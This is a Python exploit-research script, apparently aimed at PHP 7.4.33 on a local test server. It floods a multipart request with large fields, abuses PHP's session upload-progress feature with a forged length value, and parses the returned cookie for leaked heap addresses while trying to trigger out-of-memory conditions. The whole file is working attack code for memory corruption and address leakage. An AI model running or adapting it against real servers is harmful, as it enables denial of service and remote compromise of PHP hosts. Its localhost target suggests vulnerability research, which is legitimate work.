"""On 7.4.33: try to force OOM with a SINGLE request that has BOTH many large fields AND a forge.
The key insight: 8.4.26 OOMs because the 12MB field is stored. On 7.4.33, the 12MB field is not
stored (per-field limit). But if we use MANY 1.8MB fields in the SAME request, they accumulate in
memory (not freed one-by-one) and might OOM. Try: 10-20 x 1.8MB fields + forge + SID + progress."""
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

URL = "http://127.0.0.1:18108/"

def fire(n_fields, forge_size, forged_len_off, forged_val=0x1000):
    t = E.Target(URL, timeout=180.0, verbose=False)
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(n_fields):
        parts.append({"name": f"m{i:04d}", "data": b"M" * int(1.8 * 1024 * 1024)})
    forge = bytearray(b"F" * forge_size)
    if forged_len_off + 8 <= forge_size:
        struct.pack_into("<Q", forge, forged_len_off, forged_val)
    if forged_len_off + 8 < forge_size:
        forge[forged_len_off + 8] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    try:
        resp = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180.0)
    except Exception as e:
        return None, 0, 0, str(e)
    raw = E.parse_cookie(resp)
    c = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    best = max(c.values()) if c else 0
    oom = b"Fatal" in resp or b"Allowed" in resp or b"memory" in resp.lower()
    return oom, len(raw), best, None

print("=== 7.4.33: many 1.8MB fields + forge (single request) ===", flush=True)
for n_fields in [5, 8, 12, 16, 20]:
    for forge_size in [79, 128]:
        for foff in [0x10, 0x18]:
            oom, clen, best, err = fire(n_fields, forge_size, foff)
            mark = "  <<< HIT" if best >= 8 else ""
            print(f"n={n_fields} forge={forge_size}B foff=0x{foff:x}: oom={oom} cookie={clen}B heapmax={best}{mark} {err or ''}", flush=True)
            time.sleep(0.2)
